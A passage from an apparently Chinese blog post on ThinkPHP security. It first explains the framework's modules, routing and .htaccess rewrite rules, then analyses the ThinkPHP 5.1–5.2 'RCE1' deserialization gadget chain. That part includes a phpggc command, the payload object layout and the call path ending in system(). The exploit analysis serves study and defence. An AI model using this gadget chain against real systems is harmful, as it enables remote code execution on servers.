<tr>
<td>模板块定义</td>
<td><code>&#123;block name=&quot;title&quot;&#125;标题&#123;/block&#125;</code></td>
</tr>
</tbody></table>
<h3 id="多模块模式"><a href="#多模块模式" class="headerlink" title="多模块模式"></a>多模块模式</h3><p><strong>多模块模式</strong>是指 ThinkPHP 将应用划分为多个“模块”，每个模块具备完整的 MVC 结构，独立开发和部署。这样可以<strong>支持项目复杂性拆分、职责隔离、团队协作</strong>，以及每个子系统的独立性。多个模块之间完全解耦，可以在开发过程中减少冲突，提升代码的可重用性。每个模块可以有独立的配置，例如数据库连接、缓存设置等。</p>
<p>例如下面这个目录结构中定义了三个模块：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">application/              ← 前台展示（用户访问的网站页面）</span><br><span class="line">├── index/</span><br><span class="line">│   ├── controller/       ← 控制器类，如 Index.php</span><br><span class="line">│   ├── model/            ← 模型类，如 User.php</span><br><span class="line">│   └── view/             ← 模板视图文件</span><br><span class="line">├── admin/                ← 后台管理（管理员操作系统）</span><br><span class="line">│   ├── controller/       ← 后台控制器，如 Dashboard.php</span><br><span class="line">│   ├── model/</span><br><span class="line">│   └── view/</span><br><span class="line">├── api/                  ← 对外提供的接口服务（如 APP 接口）</span><br><span class="line">│   ├── controller/       ← API 控制器，如 User.php</span><br><span class="line">│   └── model/</span><br><span class="line">├── common.php            ← 公共函数</span><br><span class="line">├── config.php            ← 全局配置</span><br><span class="line">└── route.php             ← 路由定义</span><br></pre></td></tr></table></figure></div>

<h3 id="路由访问形式"><a href="#路由访问形式" class="headerlink" title="路由访问形式"></a>路由访问形式</h3><p>在 <strong>多模块 + MVC 模式</strong>下，ThinkPHP 默认的 URL 路由格式如下，这个 URL 路由格式实际上是 ThinkPHP 遵循的<strong>“约定优于配置”</strong>设计思想的体现。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://域名/模块/控制器/操作</span><br></pre></td></tr></table></figure></div>

<p>默认情况下，框架根据 URL 解析出模块名、控制器名和方法名，自动映射到 <code>application/</code> 目录下对应的位置：</p>
<ul>
<li><code>/模块</code>：框架会根据 URL 中的模块名去 <code>application/模块名/</code> 目录查找。</li>
<li><code>/控制器</code>：框架会根据控制器名去 <code>controller/控制器名.php</code> 查找类文件，类名首字母大写。</li>
<li><code>/操作（方法）</code>：框架会调用控制器（对应类文件）中的方法，方法名需要与 URL 中的操作名一致。</li>
</ul>
<p>例如：</p>
<ul>
<li><code>http://localhost/index/index/index</code> → <code>application/index/controller/Index.php::index()</code></li>
<li><code>http://localhost/admin/user/login</code> → <code>application/admin/controller/User.php::login()</code></li>
<li><code>http://localhost/api/user/info</code> → <code>application/api/controller/User.php::info()</code></li>
</ul>
<p>默认路由规则由框架自动解析，但你可以在 <code>route.php</code> 中定义自定义路由规则，将 URL 映射到不同的控制器和方法，实现路由美化、RESTful 路由等。这样可以对默认的路由行为进行精细控制。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在 PhpStudy 中将网站的根目录修改为 ThinkPHP 的 <code>public</code> 目录是部署的标准做法，但如果<strong>没有手动配置伪静态</strong>，PhpStudy 默认会<strong>覆盖 <code>public/.htaccess</code> 文件为空文件</strong>。这将导致 Apache 无法进行 URL 重写，进而使 ThinkPHP 的默认路由失效（如 <code>/index/index/index</code> 会直接返回 404）。</p>
<p>即使你恢复了 ThinkPHP 默认的 <code>.htaccess</code> 文件，其内容如下：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_rewrite.c</span>&gt;</span></span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这个配置采用的是 <strong>PATH_INFO 模式</strong>，即希望 Apache 将 <code>index.php/模块/控制器/操作</code> 中 <code>/模块/控制器/操作</code> 自动作为 PATH_INFO 传递给 PHP。但这依赖于服务器环境（Apache + PHP-FPM 或 CGI）是否启用了对 PATH_INFO 的支持。</p>
<p>在 PhpStudy 的默认环境中，<strong>往往并未启用 <code>AcceptPathInfo</code> 或 PHP 的 <code>cgi.fix_pathinfo</code> 配置不兼容</strong>，因此该写法虽然是 ThinkPHP 默认提供的，却会导致 URL 无法正确解析（框架无法获取到 PATH_INFO）。</p>
<p>为了解决这个问题，我们建议改用 <strong>兼容模式</strong> 的 <code>.htaccess</code> 重写规则：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_rewrite.c</span>&gt;</span></span><br><span class="line">    RewriteEngine On</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">    RewriteRule ^(.*)$ index.php?s=$1 [QSA,PT,L]</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>该规则通过 GET 参数 <code>s</code> 传递 URL 信息，例如访问 <code>/index/index/index</code> 会被重写为：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=index/index/index</span><br></pre></td></tr></table></figure></div>

<p>ThinkPHP 内部会自动读取 <code>$_GET[&#39;s&#39;]</code> 并将其作为 pathinfo 进行解析。这种方式属于 ThinkPHP 支持的 <strong>URL 兼容模式</strong>，从 TP3 到 TP5.2 都有内置兼容逻辑，对服务器环境几乎没有要求，<strong>是最通用、最稳定的解决方案</strong>。</p>

    </div>
  </div>

<p><code>route.php</code> 是 ThinkPHP 中定义路由规则的文件，位于 <code>application/</code> 目录下，主要用于进行 URL 的映射、重写和自定义。默认情况下，ThinkPHP 自动加载该文件，并根据文件中的配置来解析路由规则。</p>
<p><code>route.php</code> 中的规则用于将 <strong>URL</strong> 映射到具体的 <strong>控制器方法</strong>。例如，你可以将 <code>http://localhost/login</code> 映射到 <code>application/admin/controller/User.php</code> 中的 <code>login()</code> 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 映射 /login 到 Admin 控制器的 login 方法</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;admin/user/login&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p>另外 <code>route.php</code> 还支持其他多种路由配置模式：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单的路由映射</span></span><br><span class="line"><span class="comment">// 映射 /login 到 admin/user/login 方法</span></span><br><span class="line"><span class="comment">// 访问 http://localhost/login 将会调用 application/admin/controller/User.php 的 login() 方法。</span></span><br><span class="line"><span class="comment">// 这里使用了 GET 请求方式，如果需要其他请求类型，可以使用 `Route::post()` 或 `Route::put()` 等方法。</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;admin/user/login&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态路由（带参数）</span></span><br><span class="line"><span class="comment">// 访问 http://localhost/user/42 会将 42 作为参数传递给 show() 方法。</span></span><br><span class="line"><span class="comment">// 映射的规则是 /user/:id 到 api/user/show 方法，id 将传递到 show($id) 方法中。</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user/:id&#x27;</span>, <span class="string">&#x27;api/user/show&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// RESTful 路由（适用于 CRUD）</span></span><br><span class="line"><span class="comment">// 自动生成常见的 CRUD 路由：</span></span><br><span class="line"><span class="comment">// GET /user        → 显示用户列表（index()）</span></span><br><span class="line"><span class="comment">// POST /user       → 创建新用户（create()）</span></span><br><span class="line"><span class="comment">// GET /user/:id    → 获取指定用户（read($id)）</span></span><br><span class="line"><span class="comment">// PUT /user/:id    → 更新指定用户（update($id)）</span></span><br><span class="line"><span class="comment">// DELETE /user/:id → 删除指定用户（delete($id)）</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">resource</span>(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;api/user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由分组</span></span><br><span class="line"><span class="comment">// 路由分组允许你为一组路由定义统一的前缀或中间件。</span></span><br><span class="line"><span class="comment">// 例如，所有的路由都以 /admin 开头。访问 /admin/dashboard 会映射到 application/admin/controller/Dashboard.php 的 index() 方法。</span></span><br><span class="line"><span class="comment">// 访问 /admin/login 会映射到 application/admin/controller/User.php 的 login() 方法。</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">group</span>(<span class="string">&#x27;admin&#x27;</span>, function () &#123;</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;dashboard&#x27;</span>, <span class="string">&#x27;admin/dashboard/index&#x27;</span>); <span class="comment">// 后台首页</span></span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;admin/user/login&#x27;</span>);         <span class="comment">// 后台登录</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由参数匹配规则</span></span><br><span class="line"><span class="comment">// 这条路由规则将限制 id 参数为数字。访问 /user/42 将会调用 api/user/show 方法并传递 42 作为参数。</span></span><br><span class="line"><span class="comment">// 访问 /user/abc 将会匹配失败，因为 abc 不是数字。</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user/:id&#x27;</span>, <span class="string">&#x27;api/user/show&#x27;</span>)-&gt;<span class="title function_ invoke__">pattern</span>([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="string">&#x27;\d+&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ThinkPHP 的中路径参数是 URL 路径中的一部分，通过路由规则中的 <code>:变量名</code> 来定义。例如下面这个例子：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user/:id/:name&#x27;</span>, <span class="string">&#x27;index/user/profile&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">profile</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$id</span>, <span class="subst">$name</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>路由定义中的 <code>:id</code>、<code>:name</code> 会 <strong>自动匹配并注入到函数参数中</strong>（<strong>路径参数独有的特性</strong>），因此我们不需要通过 <code>input</code> 来获取参数。</p>
<p>另外路径参数<strong>默认是字符串类型</strong>，不会自动进行强制类型转换。如果需要<strong>限制传递的参数类型</strong>则需要使用 <code>pattern()</code> 限制。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user/:id&#x27;</span>, <span class="string">&#x27;index/user/show&#x27;</span>)-&gt;<span class="title function_ invoke__">pattern</span>([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="string">&#x27;\d+&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>

<p><strong>但这只是“限制格式”，不等于类型转换</strong>，控制器中仍需 <code>(int)$id</code> 或用 <code>/d</code> 过滤。</p>

    </div>
  </div>

<h2 id="框架分析"><a href="#框架分析" class="headerlink" title="框架分析"></a>框架分析</h2><h3 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h3><p>源码的目录结构大致如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">thinkphp/</span><br><span class="line">├── base.php                ★ 极简启动器：常量、自动加载、助手函数</span><br><span class="line">├── start.php               ★ 正式启动器：实例化 App 并执行 run()</span><br><span class="line">├── helper.php              通用助手函数（url(), dump() 等）</span><br><span class="line">├── convention.php          框架默认配置</span><br><span class="line">├── lang/zh-cn.php          框架内置中文语言包</span><br><span class="line">└── library/</span><br><span class="line">    └── think/              ★ 所有核心类都在这里</span><br><span class="line">        ├── App.php</span><br><span class="line">        ├── Request.php</span><br><span class="line">        ├── Response.php</span><br><span class="line">        ├── Route.php</span><br><span class="line">        ├── Controller.php</span><br><span class="line">        ├── Model.php</span><br><span class="line">        ├── Db.php</span><br><span class="line">        ├── Validate.php</span><br><span class="line">        ├── ...</span><br><span class="line">        ├── cache/          缓存子系统</span><br><span class="line">        ├── config/         配置文件解析</span><br><span class="line">        ├── console/        CLI 命令框架</span><br><span class="line">        ├── db/             ORM / 查询构建器</span><br><span class="line">        ├── debug/          调试/Trace 面板</span><br><span class="line">        ├── exception/      框架级异常类型</span><br><span class="line">        ├── facade/         门面类（静态代理）</span><br><span class="line">        ├── model/          ORM 关联、Pivot、Trait 等</span><br><span class="line">        ├── process/        进程&amp;子进程封装（pipes/Windows.php*）</span><br><span class="line">        ├── route/          路由调度实现</span><br><span class="line">        ├── session/        Session 驱动</span><br><span class="line">        ├── template/       模板引擎</span><br><span class="line">        ├── validate/       验证规则</span><br><span class="line">        └── view/           视图库</span><br></pre></td></tr></table></figure></div>

<h3 id="框架启动"><a href="#框架启动" class="headerlink" title="框架启动"></a>框架启动</h3><h3 id="路由分发"><a href="#路由分发" class="headerlink" title="路由分发"></a>路由分发</h3><h1 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h1><h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="RCE1（影响-5-1-x-5-2-x）"><a href="#RCE1（影响-5-1-x-5-2-x）" class="headerlink" title="RCE1（影响 5.1.x - 5.2.x）"></a>RCE1（影响 5.1.x - 5.2.x）</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li><p><strong>影响范围</strong> ：5.1.x - 5.2.x</p>
</li>
<li><p><strong>生成命令</strong> ：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc ThinkPHP/RCE1 system <span class="built_in">id</span>  -b</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>反序列化对象</strong> ：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPRCE1.svg"
                      alt="TPRCE1"
                ></p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">think\process\pipes\Windows <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [<span class="attr">files</span>:think\process\pipes\<span class="attr">Windows</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; think\model\Pivot <span class="title function_ invoke__">Object</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="attr">data</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [smi1e] =&gt; id</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [<span class="attr">withAttr</span>:think\<span class="attr">Model</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [smi1e] =&gt; system</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>反序列化调用链</strong> ：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">think\process\pipes\Windows-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">    └── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>()</span><br><span class="line">         └── <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>)</span><br><span class="line">              └── <span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)      <span class="comment">// ✅ 需要构造：$this-&gt;files = [Pivot对象]</span></span><br><span class="line"></span><br><span class="line">think\model\concern\Conversion-&gt;<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">    └── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>()</span><br><span class="line">         └── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>()</span><br><span class="line">              └── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>)        <span class="comment">// ✅ 需要构造：</span></span><br><span class="line">                                             <span class="comment">//     $this-&gt;visible = null（确保走默认分支）</span></span><br><span class="line">                                             <span class="comment">//     $this-&gt;data = [&#x27;smi1e&#x27; =&gt; &#x27;id&#x27;] （任意键值，控制 $key）</span></span><br><span class="line">                                             <span class="comment">//     $this-&gt;withAttr = [&#x27;smi1e&#x27; =&gt; &#x27;system&#x27;]（控制执行函数）</span></span><br><span class="line"></span><br><span class="line">think\model\concern\Attribute-&gt;<span class="title function_ invoke__">getAttr</span>()</span><br><span class="line">    └── <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$key</span>)         <span class="comment">// 从 $this-&gt;data[$key] 获取值（如 &#x27;id&#x27;）</span></span><br><span class="line">    └── <span class="variable">$fieldName</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$key</span>)  <span class="comment">// 转为下划线字段名（&#x27;smi1e&#x27; -&gt; &#x27;smi1e&#x27;）</span></span><br><span class="line">    └── <span class="variable">$closure</span> = <span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>]<span class="comment">// 取出 system / 匿名函数</span></span><br><span class="line">    └── <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data)         <span class="comment">// ✅ 最终执行点，system(&quot;id&quot;, [...])</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h3><p><code>think\process\pipes\Windows</code> 类的 <code>__destruct</code> 函数调用到自身的 <code>removeFiles</code> 函数。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>(); <span class="comment">// 👈 调用 Windows::removeFiles</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\process\pipes\Windows::removeFiles</code> 函数会对 <code>$this-&gt;files</code> 数组中的项调用 <code>file_exists</code> 函数。 <code>file_exists</code> 函数的参数应该是字符串类型，因此该函数内部会触发参数的 <code>__toString</code> 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除临时文件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//  $this-&gt;files 数组中存放一个 think\model\Pivot 对象</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123; <span class="comment">// 👈 触发 Conversion::__toString 魔术方法</span></span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在 <code>Windows::removeFiles</code> 之前调用的 <code>Windows::close</code> 函数会遍历 <code>$this-&gt;fileHandles</code> 然后调用 <code>fclose</code> 函数释放资源，我们只需要将 <code>$this-&gt;fileHandles</code> 设置为空就不会影响到我们的利用流程。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritdoc</span>&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">parent</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;fileHandles <span class="keyword">as</span> <span class="variable">$handle</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;fileHandles = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>我们可以在  <code>$this-&gt;files</code> 数组中存放一个 <code>think\model\Pivot</code> 对象。</p>
<p>由于 <code>Pivot</code> <strong>通过继承抽象类 <code>Model</code><strong>，</strong>而 <code>Model</code> 使用了 <code>think\model\concern\Conversion</code> 和 <code>think\model\concern\Attribute</code> 这两个 trait</strong>，从而获得了这些方法：</p>
<ul>
<li><p><code>Pivot-&gt;__toString</code>：<code>Conversion::__toString</code></p>
</li>
<li><p><code>Pivot-&gt;getAttr</code>：<code>Attribute::getAttr</code></p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/pivot.png"
                      alt="pivot"
                ></p>
<p>因此前面 <code>Windows::removeFiles</code> 调用的 <code>file_exists</code> 触发了 <code>$filename</code> 也就是 <code>Pivot</code> 的 <code>__toString</code> 方法。从而会有 <strong><code>Conversion::__toString → Conversion::toJson → Conversion::toArray</code></strong> 调用链。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 